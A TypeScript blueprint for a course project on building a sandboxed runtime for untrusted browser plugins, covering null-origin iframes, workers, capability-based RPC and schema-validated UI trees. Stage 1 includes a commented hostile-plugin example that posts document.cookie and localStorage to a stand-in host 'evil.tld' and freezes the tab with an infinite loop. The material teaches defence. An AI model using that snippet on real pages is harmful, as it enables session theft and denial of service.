import type { ProjectBlueprint } from '../types';

/** The dare — run untrusted third-party code in your page and survive it. */
export const sandboxRuntimeProject: ProjectBlueprint = {
  id: 'adv-sandbox-runtime',
  title: 'A Plugin Runtime That Executes Code You Do Not Trust',
  tagline: 'Third-party plugins, in your page, with your user session — and no path to their data.',
  realWorldAnalog: 'Figma plugins / Shopify checkout extensions',
  track: 'product',
  tier: 'flagship',
  difficulty: 'Principal',
  estimatedBuildTimeHours: 20,
  architecturePattern: 'Capability-based sandbox: null-origin iframe + worker + RPC membrane',
  prerequisites: ['inter-designed-dashboard'],
  summary:
    'Build a runtime that lets untrusted plugin code render UI and call host APIs, where a hostile plugin cannot read the session, exfiltrate data, or freeze the page. The security model is the entire project: every capability a plugin holds must be one you deliberately handed it, and the interesting failures are the ones that look safe.',
  tags: ['Security', 'Sandboxing', 'Workers', 'CSP', 'Principal'],
  xpBounty: 520,
  coreScopeBoundaries: {
    inScopeMinimal: [
      'Plugin execution in a null-origin sandboxed iframe hosting a Worker.',
      'A structured RPC membrane — no host object ever crosses the boundary.',
      'A capability manifest: a plugin receives exactly the APIs it declared.',
      'A watchdog that terminates a plugin exceeding its time or memory budget.',
    ],
    outOfScopeBloat: [
      'A plugin marketplace, billing, or review pipeline.',
      'A custom JavaScript interpreter — the platform already isolates.',
      'Server-side plugin execution.',
    ],
  },
  stages: [
    {
      stageNumber: 1,
      stageName: 'eval and good intentions',
      focus: 'Running plugin code in the host realm',
      codeSnippet: `const fn = new Function('host', pluginSource);\nfn(hostApi);            // plugin now shares your realm\n\n// A three-line hostile plugin:\n// fetch('https://evil.tld', { method: 'POST',\n//   body: JSON.stringify({ c: document.cookie, s: localStorage }) });\n// while (true) {}   // and the tab is gone`,
      failureModeOrInvariant:
        'The plugin has the host origin, so it holds the session cookie, localStorage, the DOM and every fetch credential. An infinite loop freezes the main thread. Freezing prototypes does not help — the plugin can reach the same globals through any object it is handed.',
      architecturalLesson:
        'Isolation is a property of the realm and the origin, not of how carefully you pass objects. Same realm means no isolation at all.',
    },
    {
      stageNumber: 2,
      stageName: 'A boundary the platform enforces',
      focus: 'Null-origin iframe, worker realm, CSP, postMessage only',
      codeSnippet: `<iframe sandbox="allow-scripts"          <!-- no allow-same-origin: null origin -->\n        csp="default-src 'none'; script-src 'unsafe-inline'"\n        src="data:text/html,..."></iframe>\n\n// Inside: the plugin runs in a Worker, so it cannot touch even that DOM\nworker.postMessage({ type: 'render', props: structuredClone(safeProps) });\n// structuredClone throws on functions — accidental capability leaks fail loudly`,
      failureModeOrInvariant:
        'The plugin realm has a null origin, so it shares no storage, no cookies and no DOM with the host. A runaway loop blocks only its own worker thread. Crucially, `allow-scripts` together with `allow-same-origin` would silently undo all of this — the two flags together are equivalent to no sandbox.',
      architecturalLesson:
        'structuredClone as the only transport is a design choice, not a limitation: if a value cannot be cloned it cannot be a capability leak.',
    },
    {
      stageNumber: 3,
      stageName: 'Capabilities, not permissions',
      focus: 'A membrane that hands out revocable, narrow references',
      codeSnippet: `// The plugin never receives an object — only a token it can call back with\nconst grant = capabilities.issue(pluginId, 'storage:read', { keys: ['prefs'] });\n\nonMessage(({ cap, method, args }) => {\n  const grant = registry.resolve(cap);            // unknown token: reject\n  if (!grant || grant.revoked) return deny();\n  if (!grant.allows(method, args)) return deny(); // arguments checked, not just method\n  return grant.invoke(method, args);\n});`,
      failureModeOrInvariant:
        'A plugin granted storage:read for `prefs` cannot read `session` by passing a different key, because the grant validates arguments and not merely the method name. Revoking a grant takes effect on the next call with no plugin cooperation.',
      architecturalLesson:
        'A permission is a question asked at the boundary; a capability is an unforgeable reference. Capabilities compose and revoke cleanly, which is why every real plugin system converges on them.',
    },
    {
      stageNumber: 4,
      stageName: 'Budgets and blast radius',
      focus: 'Watchdogs, rendering untrusted trees, telemetry per plugin',
      codeSnippet: `// The host owns the DOM; plugins describe it and never touch it\nconst tree = PluginNodeSchema.parse(message.tree);   // reject unknown node types\n\n// Time budget enforced from the host, since the worker cannot police itself\nconst deadline = setTimeout(() => worker.terminate(), 32);\n// href/src are validated against an allowlist: javascript: is a script tag`,
      failureModeOrInvariant:
        'A plugin returning a node with an onClick string, a javascript: href, or an unknown type is rejected at the schema rather than rendered. A plugin missing its 32ms frame budget is terminated and shown as degraded, not allowed to drop frames for everyone.',
      architecturalLesson:
        'Untrusted UI is data describing a tree, never markup. The host decides what a described node is permitted to become.',
    },
  ],
  deliverables: [
    { id: 'Host', title: 'Host', spec: 'A host shell rendering plugin surfaces into bounded grid slots it owns, each with an identity badge, a revoke control at the trailing edge, rem-sized dimensions and an aspect-ratio reservation.' },
    { id: 'Architecture', title: 'Architecture', spec: 'A written boundary document stating which state belongs to the host, which to the plugin, and which to the server, with the enforcement point for each.' },
  ],
  layers: [
    {
      layer: 'Host',
      components: ['capability registry', 'RPC router', 'watchdog', 'plugin surface renderer'],
      invariants: ['No host object reference ever crosses the postMessage boundary.'],
    },
    {
      layer: 'Boundary',
      components: ['null-origin iframe', 'per-plugin Worker', 'structured-clone transport', 'CSP'],
      invariants: ['allow-scripts and allow-same-origin are never set together.'],
    },
    {
      layer: 'Plugin',
      components: ['plugin SDK shim', 'declared capability manifest'],
      invariants: ['A plugin holds only capabilities its manifest declared and the user approved.'],
    },
  ],
  explicitTopics: [
    // Declared because the manifest claims them against a stage rather than a
    // deliverable — a stage anchor evidences nothing on its own.
    { category: 'JavaScript', topic: 'Prototypes, the prototype chain and classes', subtopic: 'Stage 1', howCovered: 'Freezing prototypes is shown to be no defence, because the plugin reaches the same intrinsics through any handed object', conceptIds: ['js-prototypes'] },
    { category: 'JavaScript', topic: 'Scope, hoisting, TDZ and closures', subtopic: 'Stage 3', howCovered: 'A capability is a closure over a grant record, which is what makes it unforgeable and revocable', conceptIds: ['js-scope-closures'] },
    { category: 'JavaScript', topic: '`this`, call/apply/bind and arrow functions', subtopic: 'Stage 3', howCovered: 'Host methods are never handed over; only bound, argument-checked thunks cross, or the receiver becomes the capability', conceptIds: ['js-this'] },
    { category: 'JavaScript', topic: 'Promises, async/await and cancellation', subtopic: 'Stage 3', howCovered: 'Every RPC call is a promise with a timeout, because a plugin that never replies must not leave a pending host request', conceptIds: ['js-promises'] },
    { category: 'JavaScript', topic: 'ES modules, CommonJS and dynamic import', subtopic: 'Stage 2', howCovered: 'The plugin SDK is a module boundary, and what it does not export is the actual security surface', conceptIds: ['js-modules'] },
    { category: 'JavaScript', topic: 'DOM APIs, events, bubbling and delegation', subtopic: 'Stage 4', howCovered: 'Plugin interactions arrive as messages, and the host synthesises the real DOM events after validating them', conceptIds: ['js-dom-events'] },
    { category: 'JavaScript', topic: 'Polyfills, debounce, throttle, curry, deep clone', subtopic: 'Stage 4', howCovered: 'The RPC layer is a hand-written correlation-id dispatcher with timeout, cancel and backpressure', conceptIds: ['js-polyfills'] },
    { category: 'JavaScript', topic: 'Types, coercion and equality', subtopic: 'Stage 4', howCovered: 'Every value from a plugin is untrusted JSON, converted once at the parse boundary with an explicit rejection path', conceptIds: ['js-types-coercion'] },
    { category: 'JavaScript', topic: 'Sameness: `==`, `===`, `Object.is`, `NaN`, `+0`/`-0`', subtopic: 'Stage 3', howCovered: 'Capability token comparison must be exact and constant-time-safe, so loose equality is a security bug', conceptIds: ['js-equality-matrix'] },
    { category: 'JavaScript', topic: 'Handling undefined: `??`, `||`, `?.`, `??=`, default parameters', subtopic: 'Stage 3', howCovered: 'A manifest field of 0 or false is a real constraint, so ?? is the only correct default operator in the grant parser', conceptIds: ['js-defaulting-operators'] },
    { category: 'React Advanced', topic: 'Error boundaries, portals, refs and imperative escape hatches', subtopic: 'Stage 4', howCovered: 'Every plugin surface is boundary-wrapped and rendered through a portal the host owns', conceptIds: ['react-errors-portals'] },
    { category: 'React Core', topic: 'Class components and the lifecycle vocabulary', subtopic: 'Stage 4', howCovered: 'The plugin boundary is a class, since a plugin render error must be caught rather than propagated', conceptIds: ['react-class-lifecycle'] },
    { category: 'React Core', topic: 'Fiber WorkLoop, Double-Buffering & Virtual DOM Reconciliation', subtopic: 'Stage 4', howCovered: 'Plugin node ids become keys, so a re-described tree preserves host state for the nodes that persisted', conceptIds: ['react-rendering-model'] },
    { category: 'React Core', topic: 'State Batching, Updaters & Closure Capture Semantics', subtopic: 'Stage 3', howCovered: 'Grant state, plugin lifecycle and UI state are separate machines, because revocation must be immediate and total', conceptIds: ['react-state'] },
    { category: 'React Core', topic: 'useEffect — dependencies, cleanup and when not to use it', subtopic: 'Stage 2', howCovered: 'Worker creation, port transfer, termination and frame removal are effects whose teardown is a security requirement', conceptIds: ['react-effects'] },
    { category: 'React Core', topic: 'useRef, useContext, useReducer and custom hooks', subtopic: 'Stage 3', howCovered: 'Context carries the capability registry, and useRef holds worker handles that must never trigger a render', conceptIds: ['react-hooks-rest'] },
    { category: 'React Core', topic: 'Immutability in React — mutating vs copying methods', subtopic: 'Stage 3', howCovered: 'The grant registry is replaced rather than mutated, so an audit log of every permission change exists by construction', conceptIds: ['react-immutability'] },
    { category: 'React Advanced', topic: 'Composition: children, render props, HOCs, compound components', subtopic: 'Stage 4', howCovered: 'Host components are registered by name, and a plugin composes them without ever holding one', conceptIds: ['react-composition'] },
    { category: 'React Advanced', topic: 'memo, useMemo, useCallback, virtualization, profiling', subtopic: 'Stage 4', howCovered: 'Per-plugin frame budgets are measured, and a plugin over budget is terminated rather than allowed to drop frames', conceptIds: ['react-perf'] },
    { category: 'React 19', topic: 'Actions, `useActionState`, `useFormStatus`, `useOptimistic`', subtopic: 'Stage 4', howCovered: 'A plugin-described form maps to a host Action, so the plugin never touches the submission or its credentials', conceptIds: ['r19-actions'] },
    { category: 'State Management', topic: 'Redux core: store, actions, reducers, pure functions, data flow', subtopic: 'Stage 3', howCovered: 'The grant and audit log is a reducer, since every permission change must be replayable for a security review', conceptIds: ['redux-core'] },
    { category: 'State Management', topic: 'react-redux, middleware, thunks and Redux Toolkit', subtopic: 'Stage 3', howCovered: 'createSlice manages host state while plugin state is deliberately kept outside it', conceptIds: ['redux-react-toolkit'] },
    { category: 'Tooling', topic: 'Flux — and why Mettl still asks about it', subtopic: 'Stage 3', howCovered: 'One dispatcher validates everything a plugin asks for, which is why the boundary is auditable at all', conceptIds: ['tooling-flux'] },
    { category: 'Architecture', topic: 'Front-end system design: components, data, states, failure', subtopic: 'Stage 1', howCovered: 'The threat model, the capability catalogue and the degradation policy are the first three documents', conceptIds: ['frontend-system-design'] },
    { category: 'Testing', topic: 'Testing Library, what to test, mocking and end-to-end', subtopic: 'Stage 3', howCovered: 'Every attack in the threat model becomes a test, including one that must fail to read the host session', conceptIds: ['testing-react'] },
    { category: 'Tooling', topic: 'Webpack, Vite, Babel, tree shaking and code splitting', subtopic: 'Stage 2', howCovered: 'Plugin bundles are built separately with SRI hashes, and the host build must never inline plugin code', conceptIds: ['tooling-bundlers'] },
    { category: 'Web Platform', topic: 'HTTP, status codes, methods and idempotency', subtopic: 'Stage 3', howCovered: 'A plugin fetch is proxied through the host, which enforces an allowlist and strips credentials', conceptIds: ['web-http'] },
    { category: 'Web Platform', topic: 'URL to pixels — the critical rendering path', subtopic: 'Stage 2', howCovered: 'Plugin frames load after first paint, so an untrusted plugin can never delay the host critical path', conceptIds: ['web-how-page-loads'] },
    { category: 'HTML', topic: 'Semantic elements and document outline', subtopic: 'Stage 4', howCovered: 'A described node maps to a real element, so plugin UI is accessible rather than a div canvas', conceptIds: ['html-semantics'] },
    { category: 'HTML', topic: 'Forms, labels, validation and submission', subtopic: 'Stage 4', howCovered: 'Plugin-described forms are real forms the host owns, with native validation from the described constraints', conceptIds: ['html-forms'] },
    { category: 'Accessibility', topic: 'ARIA, keyboard navigation and focus management', subtopic: 'Stage 4', howCovered: 'Heading levels and focus order are host-computed, since a plugin cannot know its surrounding context', conceptIds: ['a11y-core'] },
    { category: 'CSS', topic: 'Cascade, specificity, inheritance and `!important`', subtopic: 'Stage 4', howCovered: 'Cascade layers guarantee plugin styles can never outrank the host, regardless of specificity', conceptIds: ['css-cascade'] },
    { category: 'CSS', topic: 'Box model, display types, formatting contexts and `flow-root`', subtopic: 'Stage 4', howCovered: 'Each plugin surface is a containment context, so a plugin cannot force layout on the host tree', conceptIds: ['css-box-display'] },
    { category: 'CSS', topic: 'static, relative, absolute, fixed, sticky, containing block, z-index', subtopic: 'Stage 4', howCovered: 'A plugin may not create a full-screen overlay, so the stacking policy is host-owned and enforced', conceptIds: ['css-positioning'] },
    { category: 'CSS', topic: 'Selectors, combinators, pseudo-classes, pseudo-elements, attributes', subtopic: 'Stage 4', howCovered: 'Plugin styling is scoped by attribute and shadow boundary, so a selector cannot reach host DOM', conceptIds: ['css-selectors'] },
    { category: 'CSS', topic: 'Custom properties, design tokens, `color-mix`, nesting, `:has` layouts', subtopic: 'Stage 4', howCovered: 'Plugins receive token names, never colours, which is what stops one from impersonating host chrome', conceptIds: ['css-tokens-modern'] },
    { category: 'CSS', topic: 'Focus states, `:focus-visible`, and styling interaction accessibly', subtopic: 'Stage 4', howCovered: 'Loading, sandboxed, degraded and terminated are host-rendered states a plugin cannot fake', conceptIds: ['css-states'] },
    { category: 'JavaScript', topic: 'JS Metaprogramming (Proxy/Reflect), PWA & Package Managers (pnpm)', subtopic: 'Stage 2', howCovered: 'Parsing, transforming and executing untrusted modules is V8-level work by definition', conceptIds: ['rd-fe-js-v8-packages'] },
    { category: 'Web Platform', topic: 'Internet Basics, DNS, TCP/TLS & Critical Rendering Path', subtopic: 'Stage 1', howCovered: 'Origins, iframes and the security boundary are the browser model as a load-bearing constraint', conceptIds: ['rd-fe-internet-browser'] },
    {
      category: 'Web Platform',
      topic: 'Security',
      subtopic: 'XSS, CSRF, clickjacking and CSP',
      howCovered: 'The threat model is written first; CSP, sandbox flags and URL-scheme validation are each defeated then fixed.',
      conceptIds: ['web-security'],
    },
    {
      category: 'Web Platform',
      topic: 'Network',
      subtopic: 'Same-origin policy, origins and CORS',
      howCovered: 'The null-origin iframe makes the same-origin policy the enforcement mechanism rather than a footnote.',
      conceptIds: ['web-cors'],
    },
    {
      category: 'Web Platform',
      topic: 'Storage',
      subtopic: 'Origin-partitioned storage',
      howCovered: 'Demonstrates that a null-origin frame shares no cookies, localStorage or IndexedDB with the host.',
      conceptIds: ['web-storage'],
    },
    {
      category: 'JavaScript',
      topic: 'Data',
      subtopic: 'Structured clone vs references',
      howCovered: 'structuredClone is used as the only transport precisely because it cannot carry a function.',
      conceptIds: ['react-references-copying', 'js-arrays-objects'],
    },
    {
      category: 'TypeScript',
      topic: 'Types',
      subtopic: 'Runtime validation at a trust boundary',
      howCovered: 'Every inbound message is schema-parsed, since a type annotation is erased and proves nothing at runtime.',
      conceptIds: ['ts-essentials'],
    },
  ],
  implicitFoundations: [
    {
      domain: 'Security & Invariants',
      title: 'Realms and origins',
      mechanism: 'Each browsing context has its own realm and intrinsics; the origin tuple gates storage and DOM access.',
      realWorldImpact: 'Explains why object-freezing defences fail and platform isolation does not.',
      conceptIds: ['web-security', 'web-cors'],
    },
    {
      domain: 'V8 Engine & Memory',
      title: 'Thread isolation',
      mechanism: 'A Worker has its own event loop and heap; terminate() reclaims both immediately.',
      realWorldImpact: 'A hostile infinite loop costs one worker rather than the user’s tab.',
      conceptIds: ['js-event-loop'],
    },
  ],
  frameworkVsManual: {
    frameworkHandled: ['Browser-enforced origin isolation', 'structuredClone serialisation'],
    manualEngineeringRequired: [
      'The capability registry, the membrane and the revocation model.',
      'The threat model document, written before any code.',
      'Schema validation of every untrusted UI tree.',
    ],
  },
};
